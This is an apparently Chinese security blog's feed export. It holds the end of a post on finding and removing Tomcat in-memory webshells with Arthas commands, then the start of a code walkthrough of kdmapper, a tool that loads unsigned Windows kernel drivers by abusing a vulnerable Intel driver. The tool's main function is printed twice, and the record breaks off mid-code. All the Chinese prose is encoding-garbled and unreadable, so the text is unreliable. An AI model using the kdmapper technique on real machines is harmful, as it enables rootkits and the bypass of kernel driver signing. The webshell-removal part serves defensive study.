åˆ°<code>applicationEventListenersList</code>ä¸­</p><p>é‚£ä¹ˆç”¨Arthasä»<code>applicationEventListenersList</code>ä¸­å»æ‰æŒ‡å®šçš„<code>listener</code>è¯•è¯•çœ‹</p><p>è®¿é—®<code>http://127.0.0.1:8082/servletDemo_war_exploded/injectLister</code>å¯ä»¥æ³¨å…¥æ¶æ„listeneråå¯åŠ¨Arthasï¼Œæ‰§è¡Œå‘½ä»¤æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150321912.png" alt="image-20250907150321912"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150703008.png" alt="image-20250907150703008"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].applicationEventListenersList&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907150858859.png" alt="image-20250907150858859"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907151022390.png" alt="image-20250907151022390"></p><p>ç”±äºè¿™æ˜¯ä¸€ä¸ª<code>List</code>å¯¹è±¡ï¼Œæ‰€ä»¥åªèƒ½ç”¨ç´¢å¼•æ¥åˆ é™¤ï¼Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].applicationEventListenersList.remove(0)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Filter-å†…å­˜é©¬"><a href="#Filter-å†…å­˜é©¬" class="headerlink" title="Filter å†…å­˜é©¬"></a>Filter å†…å­˜é©¬</h2><p>è¿™ä¸ªç¨å¾®éº»çƒ¦ä¸€ç‚¹ç‚¹ï¼Œä½†æ˜¯éº»çƒ¦çš„ä¹Ÿåªæ˜¯æ­¥éª¤</p><p>è®¿é—®<code>http://127.0.0.1:8082/servletDemo_war_exploded/injectFilter</code> æ³¨å…¥å†…å­˜é©¬</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907181224721.png" alt="image-20250907181224721"></p><p>Filterå†…å­˜é©¬æ˜¯éœ€è¦å†™å…¥åˆ°<code>FilterMap</code>å’Œ<code>FilterDef</code>çš„</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715090547413.png" alt="img"></p><p>å¹¶ä¸”æ˜¯åœ¨<code>FilterMap</code>å¤„ç»‘å®šäº†è·¯ç”±ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŸ¥å°±éœ€è¦è·å–åˆ°<code>FilterMap</code>å¯¹è±¡ï¼Œè€Œ<code>FilterMap</code>åˆæ˜¯é€šè¿‡<code>addFilterMap</code>æ·»åŠ çš„ï¼Œè¿›å…¥è¯¥æ–¹æ³•çœ‹çœ‹</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715090900811-20250907165127281.png" alt="img"></p><p>é‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨Arthasçœ‹çœ‹<code>filterMaps</code>è¿™ä¸ªå˜é‡</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907172716442.png" alt="image-20250907172716442"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907172735090.png" alt="image-20250907172735090"></p><p>é‚£ä¹ˆå°±å·²ç»æŸ¥åˆ°äº†æ¶æ„è·¯ç”±</p><p>è·å–åˆ°æ¶æ„çš„FilterMapä¹‹åï¼Œè°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.StandardContext.ContextFilterMaps#remove</span><br></pre></td></tr></table></figure><p>æˆ–è€…æ˜¯å¾€ä¸Šä¸€å±‚ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.StandardContext#removeFilterMap</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ—¢ç„¶StandardContextéƒ½å·²ç»å°è£…å¥½äº†ï¼Œé‚£ä¹ˆå°±ç”¨å°è£…å¥½çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;#evilMap=instances[0].filterMaps.array[0],#standardContext=instances[0],#standardContext.removeFilterMap(#evilMap)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907180728160.png" alt="image-20250907180728160"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250907182417069.png" alt="image-20250907182417069"></p><p>æ€é©¬æˆåŠŸã€‚</p><h2 id="Valve-å†…å­˜é©¬"><a href="#Valve-å†…å­˜é©¬" class="headerlink" title="Valve å†…å­˜é©¬"></a>Valve å†…å­˜é©¬</h2><p>è¿™ä¸ªæ³¨å…¥å¾ˆç®€å•ï¼Œå°†<code>æ¶æ„Valve</code>å¯¹è±¡æ·»åŠ è¿›<code>StandardPipeline</code>å°±å¯ä»¥äº†</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715094317974.png" alt="img"></p><p>è®¿é—®<code>http://127.0.0.1:8082/servletDemo_war_exploded/injectValve</code>æ³¨å…¥å†…å­˜é©¬</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908012707752.png" alt="image-20250908012707752"></p><p>è¿›å…¥StandardPipelineä¹‹åï¼Œçœ‹æœ‰ä»€ä¹ˆæ–¹æ³•</p><p> <img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250715093636584.png" alt="img"></p><p>å­˜åœ¨ä¸€ä¸ªgetValvesï¼Œé‚£ä¹ˆè°ƒç”¨çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].getPipeline&#x27;</span></span><br><span class="line"></span><br><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;instances[0].getPipeline.getValves&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908013658009.png" alt="image-20250908013658009"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908013814240.png" alt="image-20250908013814240"></p><p>åˆšå¥½ä¹Ÿå°è£…æœ‰<code>removeValve</code>æ–¹æ³•ï¼Œé‚£ä¹ˆç›´æ¥è°ƒç”¨è¯¥æ–¹æ³•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmtool --action getInstances --className org.apache.catalina.core.StandardContext --express <span class="string">&#x27;#valve=instances[0].getPipeline().getValves()[1],#standardContext=instances[0].getPipeline().removeValve(#valve)&#x27;</span></span><br><span class="line">null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908014101515.png"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250908014206170.png" alt="image-20250908014206170"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Arthasä»‹ç»&quot;&gt;&lt;a href=&quot;#Arthasä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;Arthasä»‹ç»&quot;&gt;&lt;/a&gt;Arthasä»‹ç»&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/alibaba/arthas/blo</summary>
      
    
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>kdmapperå†…å­˜åŠ è½½ä»£ç å¿«é€Ÿè§£æ</title>
    <link href="https://250wuyifan.github.io/2025/08/30/kdmapper%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <id>https://250wuyifan.github.io/2025/08/30/kdmapper%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90/</id>
    <published>2025-08-29T20:46:14.000Z</published>
    <updated>2025-08-30T09:16:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ã€Šå†…å­˜åŠ è½½é©±åŠ¨ã€‹æ–‡ç« é‡Œé¢ï¼Œæˆ‘ä»¬è¯¦ç»†çœ‹äº†ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨é©±åŠ¨å»å†…å­˜åŠ è½½é©±åŠ¨ï¼Œè½å®åˆ°å®é™…ç§ï¼Œæˆ‘ä»¬éœ€è¦è§£å†³çš„é—®é¢˜è¿˜æ˜¯æ€ä¹ˆä¸BYOVDè”åŠ¨èµ·æ¥ï¼Œè€Œkdmapperå·¥å…·ï¼Œå·²ç»å†™å¥½äº†è¿™ä¸ªæ“ä½œï¼Œä½†æ˜¯ä»£ç è·Ÿä¸Šç¯‡æ–‡ç« è¿˜æ˜¯æœ‰å¾ˆå¤§å·®åˆ«ï¼Œåœ¨æ­¤ç»™ä»£ç åšä¸ªè¯¦è§£ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045112624.png" alt="image-20250830045112624"></p><h2 id="é¡¹ç›®æè¿°"><a href="#é¡¹ç›®æè¿°" class="headerlink" title="é¡¹ç›®æè¿°"></a>é¡¹ç›®æè¿°</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045330193.png" alt="image-20250830045330193"></p><h2 id="é¡¹ç›®ä»£ç å¤§çº²"><a href="#é¡¹ç›®ä»£ç å¤§çº²" class="headerlink" title="é¡¹ç›®ä»£ç å¤§çº²"></a>é¡¹ç›®ä»£ç å¤§çº²</h2><p>æ‰“å¼€ç»™çš„é¡¹ç›®slnï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼Œä¹Ÿæ˜¯å¾ˆå¤šæ–‡ä»¶çš„</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045223603.png" alt="image-20250830045223603"></p><p>ç²—ç•¥çš„çœ‹ä¸€ä¸‹æ–‡ä»¶åï¼Œéƒ½æ˜¯ä»€ä¹ˆåŠŸèƒ½ï¼Œç›´æ¥ç¼–è¯‘è§£å†³æ–¹æ¡ˆï¼Œè¿›è¡Œä½¿ç”¨ï¼Œæ²¡æœ‰æŠ¥é”™çš„è¯ï¼Œè¯´æ˜å¯è¡Œ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830045625978.png" alt="image-20250830045625978"></p><h2 id="ä»main-cppå…¥æ‰‹"><a href="#ä»main-cppå…¥æ‰‹" class="headerlink" title="ä»main.cppå…¥æ‰‹"></a>ä»main.cppå…¥æ‰‹</h2><p>é¡¹ç›®è¿è¡Œçš„æ—¶å€™è‚¯å®šæ˜¯ä»mainå‡½æ•°è¿è¡Œçš„ï¼Œæˆ‘ä»¬ä»æ­¤ä»£ç å…¥æ‰‹ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">const</span> <span class="type">int</span> argc, <span class="type">wchar_t</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">SetUnhandledExceptionFilter</span>(SimplestCrashHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> free = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;free&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> indPagesMode = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;indPages&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> passAllocationPtr = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;PassAllocationPtr&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> copyHeader = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;copy-header&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Free pool memory after usage enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Allocate Independent Pages mode enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free &amp;&amp; indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Can&#x27;t use --free and --indPages at the same time&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (passAllocationPtr) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Pass Allocation Ptr as first param enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copyHeader) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Copying driver header enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="type">bool</span> UpdateOffset = !(<span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;dontUpdateOffsets&quot;</span>) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> FilePathParamIdx = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;offsetsPath&quot;</span>);</span><br><span class="line">std::wstring offsetFilePath = utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\offsets.ini&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UpdateOffset &amp;&amp; FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[-] Can&#x27;t set --offsetsPath without set --dontUpdateOffsets&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">offsetFilePath = argv[FilePathParamIdx + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[+] Setting Offsets File Path To: &quot;</span> &lt;&lt; offsetFilePath &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> drvIndex = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (std::filesystem::<span class="built_in">path</span>(argv[i]).<span class="built_in">extension</span>().<span class="built_in">string</span>().<span class="built_in">compare</span>(<span class="string">&quot;.sys&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">drvIndex = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drvIndex &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::wstring driver_path = argv[drvIndex];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(driver_path)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] File &quot;</span> &lt;&lt; driver_path &lt;&lt; <span class="string">L&quot; doesn&#x27;t exist&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="keyword">if</span> (!KDSymbolsHandler::<span class="built_in">GetInstance</span>()-&gt;<span class="built_in">ReloadFile</span>(offsetFilePath, UpdateOffset ? utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\&quot;</span> + SYM_FROM_PDB_EXE : <span class="string">L&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Error: Failed To Get Symbols Info.&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Load</span>()) &#123;</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; raw_image = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!utils::<span class="built_in">ReadFileToMemory</span>(driver_path, &amp;raw_image)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to read image to memory&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line">mode = kdmapper::AllocationMode::AllocateIndependentPages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS exitCode = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!kdmapper::<span class="built_in">MapDriver</span>(raw_image.<span class="built_in">data</span>(), <span class="number">0</span>, <span class="number">0</span>, free, !copyHeader, mode, passAllocationPtr, callbackExample, &amp;exitCode)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to map &quot;</span> &lt;&lt; driver_path &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Unload</span>()) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Warning failed to fully unload vulnerable driver &quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] success&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="è®¾ç½®æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨"><a href="#è®¾ç½®æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨" class="headerlink" title="è®¾ç½®æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨"></a>è®¾ç½®æœªå¤„ç†å¼‚å¸¸è¿‡æ»¤å™¨</h3><p>ç¬¬ä¸€è¡Œå†™äº†å¼‚å¸¸å¤„ç†å™¨ï¼Œç”¨äºå¤„ç†å´©æºƒæƒ…å†µä¿¡æ¯ã€‚</p><p>SetUnhandledExceptionFilter(SimplestCrashHandler);</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG WINAPI <span class="title">SimplestCrashHandler</span><span class="params">(EXCEPTION_POINTERS* ExceptionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (ExceptionInfo &amp;&amp; ExceptionInfo-&gt;ExceptionRecord)</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[!!] Crash at addr 0x&quot;</span> &lt;&lt; ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress &lt;&lt; <span class="string">L&quot; by 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode &lt;&lt; std::endl);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[!!] Crash&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (intel_driver::hDevice)</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è§£æå‘½ä»¤è¡Œå‚æ•°"><a href="#è§£æå‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="è§£æå‘½ä»¤è¡Œå‚æ•°"></a>è§£æå‘½ä»¤è¡Œå‚æ•°</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">wmain</span><span class="params">(<span class="type">const</span> <span class="type">int</span> argc, <span class="type">wchar_t</span>** argv)</span> </span>&#123;</span><br><span class="line"><span class="built_in">SetUnhandledExceptionFilter</span>(SimplestCrashHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> free = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;free&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> indPagesMode = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;indPages&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> passAllocationPtr = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;PassAllocationPtr&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> copyHeader = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;copy-header&quot;</span>) &gt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Free pool memory after usage enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Allocate Independent Pages mode enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (free &amp;&amp; indPagesMode) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span 